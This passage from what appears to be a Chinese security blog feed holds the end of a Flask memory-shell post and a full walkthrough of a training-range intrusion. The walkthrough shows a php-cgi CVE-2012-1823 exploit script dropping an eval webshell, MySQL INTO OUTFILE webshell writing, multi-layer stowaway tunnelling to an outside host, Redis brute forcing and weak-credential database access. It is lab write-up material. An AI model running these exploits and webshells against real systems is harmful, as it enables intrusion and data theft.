punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;年轻人学的第一个内存马，竟然不是java（&lt;/p&gt;
&lt;p&gt;看大伙好像前几个月都在研究这个，学一下，顺带复健一下，已经摸了两周🐟了&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/iceyhexman/flask_memory_shell&quot;&gt;https://github.com/iceyhexman/flask_memory_shell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/&quot;&gt;http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/&quot;&gt;https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/14421&quot;&gt;https://xz.aliyun.com/t/14421&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/gxngxngxn/p/18181936&quot;&gt;https://www.cnblogs.com/gxngxngxn/p/18181936&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="flask" scheme="http://c1oudfl0w0.github.io/blog/tags/flask/"/>
    
    <category term="内存马" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>某渗透（1）</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/</id>
    <published>2024-07-25T09:06:04.000Z</published>
    <updated>2024-08-31T04:40:15.206Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是什么？NISA内部靶场，打一下</p><span id="more"></span><hr><h1 id="开局——Shiro"><a href="#开局——Shiro" class="headerlink" title="开局——Shiro"></a>开局——Shiro</h1><p>开局进入靶机</p><p>发现是一个shiro服务</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725172148296.png" alt="image-20240725172148296"></p><p>直接工具爆破一把梭</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725172229146.png" alt="image-20240725172229146"></p><p>蚁剑连接jsp马</p><p>flag在&#x2F;flag.txt：<code>WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7eb5b33e961c&#125;</code></p><p>上传fscan开扫网段</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725170928581.png" alt="image-20240725170928581"></p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725171037365.png" alt="image-20240725171037365"></p><p>result.txt</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">192.168.100.2:9000 open192.168.100.3:8080 open192.168.100.1:8080 open192.168.100.1:443 open192.168.100.2:80 open192.168.100.1:80 open192.168.100.1:22 open192.168.100.1:21 open[*] WebTitle https://192.168.100.1     code:502 len:552    title:502 Bad Gateway[*] WebTitle http://192.168.100.1      code:404 len:548    title:404 Not Found[+] FCGI 192.168.100.2:9000 Status: 403 ForbiddenX-Powered-By: PHP/7.3.33Content-type: text/html; charset=UTF-8Access denied.stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions)plesa try other path,as -path /www/wwwroot/index.php[+] ftp 192.168.100.1:21:anonymous [*] WebTitle http://192.168.100.3:8080 code:302 len:0      title:None 跳转url: http://192.168.100.3:8080/login;jsessionid=88A50ABBF8DA8065B091061A4A4A9FEB[*] WebTitle http://192.168.100.2      code:200 len:382    title:None[*] WebTitle http://192.168.100.1:8080 code:302 len:0      title:None 跳转url: http://192.168.100.1:8080/login;jsessionid=AA897C0EA332974F6AE4F884E3375F6F[*] WebTitle http://192.168.100.1:8080/login;jsessionid=AA897C0EA332974F6AE4F884E3375F6F code:200 len:2608   title:Login Page[*] WebTitle http://192.168.100.3:8080/login;jsessionid=88A50ABBF8DA8065B091061A4A4A9FEB code:200 len:2608   title:Login Page[+] PocScan http://192.168.100.2 poc-yaml-php-cgi-cve-2012-1823 [+] PocScan http://192.168.100.1:8080/ poc-yaml-shiro-key [&#123;key kPH+bIxk5D2deZiIxcaaaA==&#125; &#123;mode cbc&#125;][+] PocScan http://192.168.100.3:8080/ poc-yaml-shiro-key [&#123;key kPH+bIxk5D2deZiIxcaaaA==&#125; &#123;mode cbc&#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不知道为什么这里的shiro和tp服务都开了两个ip</p><hr><h1 id="内网代理第一层"><a href="#内网代理第一层" class="headerlink" title="内网代理第一层"></a>内网代理第一层</h1><p>在shiro靶机上传stowaway的 linux_x64_agent 进行内网代理，我这里用本机内网穿透作为公网ip</p><p>在控制端上执行（我穿透出去是30908端口）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">windows_x64_admin.exe <span class="token parameter variable">-l</span> <span class="token number">666</span> <span class="token parameter variable">-s</span> <span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在要被代理的服务器上执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./linux_x64_agent <span class="token parameter variable">-c</span> 7c61c35132.vicp.fun:30908 <span class="token parameter variable">-s</span> <span class="token number">123</span> <span class="token parameter variable">--reconnect</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725171738901.png" alt="image-20240725171738901"></p><p>在本机的6666端口做socks代理</p><p>浏览器设置对应的ip和端口进行代理</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725171822820.png" alt="image-20240725171822820"></p><p>接下来直接访问内网ip即可</p><hr><h1 id="thinkphp-or-fastcgi"><a href="#thinkphp-or-fastcgi" class="headerlink" title="thinkphp or fastcgi"></a>thinkphp or fastcgi</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[+] PocScan http://192.168.100.2 poc-yaml-php-cgi-cve-2012-1823 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考php-cgi-cve-2012-1823：<a href="https://github.com/0xl0k1/CVE-2012-1823">https://github.com/0xl0k1/CVE-2012-1823</a></p><p>上传php_cgi.sh到shiro靶机，直接跑脚本</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725174534196.png" alt="image-20240725174534196"></p><p>接下来修改一下sh脚本，上马</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">function</span> <span class="token function-name function">ctrl_c</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>[!] Exiting..."</span>  <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token builtin class-name">trap</span> ctrl_c SIGINT<span class="token comment">#if [ $# -ne 2 ]; then</span><span class="token comment">#    echo -e "\n[!] Usage: $0 &lt;RHOST> \"&lt;COMMAND>\""</span><span class="token comment">#    echo -e "\nExample: $0 http://10.128.20.2 \"whoami\"\n"</span><span class="token comment">#    exit 1</span><span class="token comment">#fi</span><span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token assign-left variable">command</span><span class="token operator">=</span><span class="token variable">$2</span><span class="token function-name function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">#payload="&lt;?php system('$command'); die(); ?>"</span>    <span class="token assign-left variable">payload</span><span class="token operator">=</span><span class="token string">"&lt;?php file_put_contents('hack.php','&lt;?php eval(\<span class="token variable">$_POST</span>[1]);'); die(); ?>"</span>    <span class="token builtin class-name">echo</span>    <span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> POST <span class="token string">"<span class="token variable">$rhost</span>/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$payload</span>"</span> --connect-timeout <span class="token number">10</span>        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$?</span> <span class="token parameter variable">-ne</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"[!] Exploit failed!"</span>    <span class="token keyword">fi</span><span class="token punctuation">&#125;</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给蚁剑挂socks代理，然后连接</p><p>传fscan</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725180319718.png" alt="image-20240725180319718"></p><p>开扫</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725180502883.png" alt="image-20240725180502883"></p><p>发现新的内网ip段10.85.101.4</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">10.85.101.4:80 open10.85.101.3:80 open10.85.101.1:80 open10.85.101.1:22 open10.85.101.4:9000 open10.85.101.3:9000 open10.85.101.2:6379 open10.85.101.1:21 open10.85.101.1:443 open[+] ftp 10.85.101.1:21:anonymous [*] WebTitle https://10.85.101.1       code:502 len:552    title:502 Bad Gateway[+] FCGI 10.85.101.3:9000 Status: 403 ForbiddenX-Powered-By: PHP/7.3.33Content-type: text/html; charset=UTF-8Access denied.stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions)plesa try other path,as -path /www/wwwroot/index.php[*] WebTitle http://10.85.101.1        code:404 len:548    title:404 Not Found[+] FCGI 10.85.101.4:9000 Status: 403 ForbiddenX-Powered-By: PHP/8.2.8Content-type: text/html; charset=UTF-8Access denied.[*] WebTitle http://10.85.101.3        code:200 len:382    title:None[*] WebTitle http://10.85.101.4        code:200 len:19411  title:phpMyAdmin[+] InfoScan http://10.85.101.4        [phpMyAdmin] [+] PocScan http://10.85.101.3 poc-yaml-php-cgi-cve-2012-1823 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="内网代理第二层"><a href="#内网代理第二层" class="headerlink" title="内网代理第二层"></a>内网代理第二层</h1><p>在tp靶机上面传入stowaway开始第二层代理</p><p>在我们主机控制端上面依次输入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">0</span>listen<span class="token number">1</span><span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725181725911.png" alt="image-20240725181725911"></p><p>这样子就在shiro靶机上建立了一个监听1234端口的连接</p><p>然后在tp靶机上连接：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./linux_x64_agent <span class="token parameter variable">-c</span> <span class="token number">192.168</span>.100.3:1234 <span class="token parameter variable">-s</span> <span class="token number">123</span> <span class="token parameter variable">--reconnect</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725181934329.png" alt="image-20240725181934329"></p><p>此时节点+1</p><p>然后再建立socks代理</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725182134496.png" alt="image-20240725182134496"></p><p>在6667端口</p><hr><h1 id="phpMyAdmin"><a href="#phpMyAdmin" class="headerlink" title="phpMyAdmin"></a>phpMyAdmin</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[*] WebTitle http://10.85.101.4        code:200 len:19411  title:phpMyAdmin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是访问phpMyAdmin，弱密码</p><p>服务与账密：<code>localhost:root:root</code></p><p>在flag数据库中找到flag：<code>WSS-Studio&#123;Mysql-08a451ad-3869-4eeb-81b3-22fa354b8aa9&#125;</code></p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725183552068.png" alt="image-20240725183552068"></p><p>接下来尝试getshell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'%secure%'</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725183841583.png" alt="image-20240725183841583"></p><blockquote><p>当<code>secure_file_priv</code>的值为<code>null</code> ，表示限制MySQL 不允许导入|导出<br>当<code>secure_file_priv</code>的值为<code>/tmp/</code> ，表示限制MySQL 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下<br>当<code>secure_file_priv</code>的值没有具体值时，表示不对 MySQL 的导入|导出做限制</p></blockquote><p>可以直接写马</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php eval($_POST[1]); ?>'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/hack.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725184023330.png" alt="image-20240725184023330"></p><p>得到flag：<code>WSS-Studio&#123;phpMyAdmin-ab21820c-a53d-4d7a-93aa-86d70a4a776b&#125;</code></p><p>蚁剑连上，ifconfig 发现新的内网ip段172.56.102.3，传fscan扫内网</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">172.56.102.3:80 open172.56.102.1:80 open172.56.102.1:22 open172.56.102.3:9000 open172.56.102.4:8080 open172.56.102.2:5432 open172.56.102.1:21 open172.56.102.1:443 open172.56.102.4:8009 open[+] FCGI 172.56.102.3:9000 Status: 403 ForbiddenX-Powered-By: PHP/8.2.8Content-type: text/html; charset=UTF-8Access denied.[+] ftp 172.56.102.1:21:anonymous [*] WebTitle http://172.56.102.4:8080  code:200 len:90     title:$Title$[*] WebTitle http://172.56.102.1       code:404 len:548    title:404 Not Found[*] WebTitle https://172.56.102.1      code:502 len:552    title:502 Bad Gateway[*] WebTitle http://172.56.102.3       code:200 len:19411  title:phpMyAdmin[+] Postgres:172.56.102.2:5432:postgres password[+] InfoScan http://172.56.102.3       [phpMyAdmin] [+] PocScan http://172.56.102.4:8080 poc-yaml-struts2_045 poc1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><p>后面打完了才发现漏了这个端口（</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">10.85.101.2:6379 open<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>stowaway转发出来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>node <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">>></span> forward <span class="token number">9000</span> <span class="token number">10.85</span>.101.2:6379<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用这个对redis的密码进行爆破：<a href="https://github.com/vgo0/redisbrute">https://github.com/vgo0/redisbrute</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─$ ./redisbrute <span class="token parameter variable">--ip</span> <span class="token number">192.168</span>.4.210 <span class="token parameter variable">--port</span> <span class="token number">9000</span> <span class="token parameter variable">--passwords</span> /usr/share/wordlists/rockyou.txt<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid password found - <span class="token number">12345</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到密码12345</p><p>登录redis，拿到flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.4.210 <span class="token parameter variable">-p</span> <span class="token number">9000</span> <span class="token parameter variable">-a</span> <span class="token string">"12345"</span><span class="token operator">></span> KEYS *<span class="token operator">></span> GET flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="内网代理第三层"><a href="#内网代理第三层" class="headerlink" title="内网代理第三层"></a>内网代理第三层</h1><p>同样的操作，在phpMyAdmin靶机上面传stowaway linux_x64_agent</p><p>主机控制端输入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">1</span>listen<span class="token number">1</span><span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>即在tp靶机上开监听1234端口</p><p>phpMyAdmin靶机上连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./linux_x64_agent <span class="token parameter variable">-c</span> <span class="token number">10.85</span>.101.3:1234 <span class="token parameter variable">-s</span> <span class="token number">123</span> <span class="token parameter variable">--reconnect</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是节点+1</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725195249782.png" alt="image-20240725195249782"></p><hr><h1 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[*] WebTitle http://172.56.102.4:8080  code:200 len:90     title:$Title$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>是struts2的服务</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725200208511.png" alt="image-20240725200208511"></p><p>工具一把梭：<a href="https://github.com/abc123info/Struts2VulsScanTools">https://github.com/abc123info/Struts2VulsScanTools</a></p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725200243894.png" alt="image-20240725200243894"></p><p>flag在&#x2F;flag.txt：<code>WSS-Studio&#123;Struts2-b086a0a3-2b93-4b8a-981b-ca00d360e773&#125;</code></p><hr><h1 id="PostgresSQL"><a href="#PostgresSQL" class="headerlink" title="PostgresSQL"></a>PostgresSQL</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[+] Postgres:172.56.102.2:5432:postgres password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>账密<code>postgres:password</code></p><p>修改kali中proxychains工具的&#x2F;etc&#x2F;proxychains4.conf，改成我们的socks代理地址</p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725211219637.png" alt="image-20240725211219637"></p><p>然后在<code>proxychains</code>下使用<code>pgcli</code>远程连接，接下来就是查询</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>└─$ proxychains pgcli <span class="token parameter variable">-h</span> <span class="token number">172.56</span>.102.2 <span class="token parameter variable">-u</span> postgres<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains4.conf<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.16</span><span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OKPassword <span class="token keyword">for</span> postgres: <span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OK<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432 Server: PostgreSQL <span class="token number">16.3</span>Version: <span class="token number">3.4</span>.1Home: http://pgcli.compostgres@172:postgres<span class="token operator">></span>  <span class="token punctuation">..</span>.  OKpostgres@172:postgres<span class="token operator">></span> <span class="token punctuation">\</span>l+-----------+----------+----------+------------+------------+-----------------------+<span class="token operator">|</span> Name      <span class="token operator">|</span> Owner    <span class="token operator">|</span> Encoding <span class="token operator">|</span> Collate    <span class="token operator">|</span> Ctype      <span class="token operator">|</span> Access privileges     <span class="token operator">|</span><span class="token operator">|</span>-----------+----------+----------+------------+------------+-----------------------<span class="token operator">|</span><span class="token operator">|</span> flag      <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">&lt;</span>null<span class="token operator">></span>                <span class="token operator">|</span><span class="token operator">|</span> postgres  <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">&lt;</span>null<span class="token operator">></span>                <span class="token operator">|</span><span class="token operator">|</span> template0 <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">=</span>c/postgres           <span class="token operator">|</span><span class="token operator">|</span>           <span class="token operator">|</span>          <span class="token operator">|</span>          <span class="token operator">|</span>            <span class="token operator">|</span>            <span class="token operator">|</span> <span class="token assign-left variable">postgres</span><span class="token operator">=</span>CTc/postgres <span class="token operator">|</span><span class="token operator">|</span> template1 <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> en_US.utf8 <span class="token operator">|</span> <span class="token operator">=</span>c/postgres           <span class="token operator">|</span><span class="token operator">|</span>           <span class="token operator">|</span>          <span class="token operator">|</span>          <span class="token operator">|</span>            <span class="token operator">|</span>            <span class="token operator">|</span> <span class="token assign-left variable">postgres</span><span class="token operator">=</span>CTc/postgres <span class="token operator">|</span>+-----------+----------+----------+------------+------------+-----------------------+SELECT <span class="token number">4</span>Time: <span class="token number">0</span>.052spostgres@172:postgres<span class="token operator">></span> <span class="token punctuation">\</span>c flag<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OKYou are now connected to database <span class="token string">"flag"</span> as user <span class="token string">"postgres"</span>Time: <span class="token number">0</span>.590spostgres@172:flag<span class="token operator">></span> <span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">192.168</span>.4.210:6668  <span class="token punctuation">..</span>.  <span class="token number">172.56</span>.102.2:5432  <span class="token punctuation">..</span>.  OKpostgres@172:flag<span class="token operator">></span> <span class="token punctuation">\</span>dt+--------+------+-------+----------+<span class="token operator">|</span> Schema <span class="token operator">|</span> Name <span class="token operator">|</span> Type  <span class="token operator">|</span> Owner    <span class="token operator">|</span><span class="token operator">|</span>--------+------+-------+----------<span class="token operator">|</span><span class="token operator">|</span> public <span class="token operator">|</span> flag <span class="token operator">|</span> table <span class="token operator">|</span> postgres <span class="token operator">|</span>+--------+------+-------+----------+SELECT <span class="token number">1</span>Time: <span class="token number">1</span>.853s <span class="token punctuation">(</span><span class="token number">1</span> second<span class="token punctuation">)</span>, executed in: <span class="token number">1</span>.851s <span class="token punctuation">(</span><span class="token number">1</span> second<span class="token punctuation">)</span>postgres@172:flag<span class="token operator">></span> SELECT * FROM flag+-------------------------------------------------------------+<span class="token operator">|</span> data                                                        <span class="token operator">|</span><span class="token operator">|</span>-------------------------------------------------------------<span class="token operator">|</span><span class="token operator">|</span> WSS-Studio<span class="token punctuation">&#123;</span>Postgresql-cb6cba4a-6d7b-43b6-bfc4-0146b0d0e5af<span class="token punctuation">&#125;</span> <span class="token operator">|</span>+-------------------------------------------------------------+SELECT <span class="token number">1</span>Time: <span class="token number">0</span>.050s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>法二：stowaway直接转发这个数据库的端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>node <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">>></span> forward <span class="token number">9000</span> <span class="token number">172.56</span>.102.2:5432<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725212738296.png" alt="image-20240725212738296"></p><p>然后navicat连接127.0.0.1:9000</p><p>如果navicat连接时报错：<code>column &quot;datlastsysoid&quot; does not exist  Line1:SELECT DISTINCT datalastsysoid FROM pg_database</code></p><p>请参考这篇文章修改对应的dll文件：<a href="https://cloud.tencent.com/developer/article/2314524">https://cloud.tencent.com/developer/article/2314524</a></p><p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725212821261.png" alt="image-20240725212821261"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这是什么？NISA内部靶场，打一下&lt;/p&gt;</summary>
    
    
